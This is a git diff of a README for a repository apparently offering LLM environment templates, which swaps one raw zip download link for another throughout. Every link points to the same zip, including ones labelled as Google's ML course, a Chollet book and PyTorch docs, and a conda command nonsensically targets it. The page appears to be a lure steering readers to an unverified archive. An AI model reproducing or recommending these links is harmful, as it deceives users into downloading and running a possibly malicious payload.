@@ -1,6 +1,6 @@
 # 🌟 llm-env-templates - Simplify LLM Development with Ready-to-Use Templates
 
-[![Download llm-env-templates](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
+[![Download llm-env-templates](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to llm-env-templates! This project provides templates for setting up you
 
 To download and set up the environments, please visit the release page:
 
-[Download from Releases](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
+[Download from Releases](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)
 
 Follow these steps:
 
@@ -48,9 +48,9 @@ Once you have downloaded the template, follow these steps to set up your environ
 3. **Create a New Environment:**
    - Run the following command:
      ```
-     conda env create -f https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip
+     conda env create -f https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip
      ```
-   - Replace `https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip` with the name of the template file you downloaded.
+   - Replace `https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip` with the name of the template file you downloaded.
 
 4. **Activate the Environment:**
    - Use this command to activate your new environment:
@@ -113,8 +113,8 @@ Join our community to share your experience, ask questions, or provide feedback.
 
 For more information on large language models and their applications, consider exploring:
 
-- [Machine Learning Crash Course by Google](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
-- [Deep Learning with Python by François Chollet](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
-- [PyTorch Documentation](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
+- [Machine Learning Crash Course by Google](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)
+- [Deep Learning with Python by François Chollet](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)
+- [PyTorch Documentation](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/examples/dev/templates-env-llm-3.1.zip)
 
 Feel free to reach out if you have any questions or need assistance. Happy coding!
